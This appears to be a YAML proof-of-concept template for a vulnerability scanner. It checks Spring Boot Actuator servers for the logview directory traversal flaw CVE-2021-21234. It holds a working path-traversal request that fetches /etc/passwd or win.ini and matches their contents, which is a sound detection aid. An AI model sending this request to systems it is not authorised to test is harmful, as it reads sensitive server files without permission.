id: poc-yaml-spring-boot-log-view-fileread
info:
  name: Spring Boot Actuator Logview 目录遍历(CVE-2021-21234)
  severity: high
  tags:
  - 文件读取
  - CVE-2021-21234
  finger: spring_boot
  fofa: null
variables:
  path: '/

    /manage/'
  payload: '/etc/passwd

    /windows/win.ini'
requests:
- method: GET
  path: '{{.path}}log/view?filename={{.payload}}&base=../../../../../../../../../../'
  expression: "status_code == 200 &&\n(\ncontains(body, \"bit app support\") && \n\
    contains(body,\"fonts\") &&\ncontains(body,\"extensions\")\n) || (\nmatches(body,\
    \ \"root:.*:0:0:\")\n)\n"
transport: http
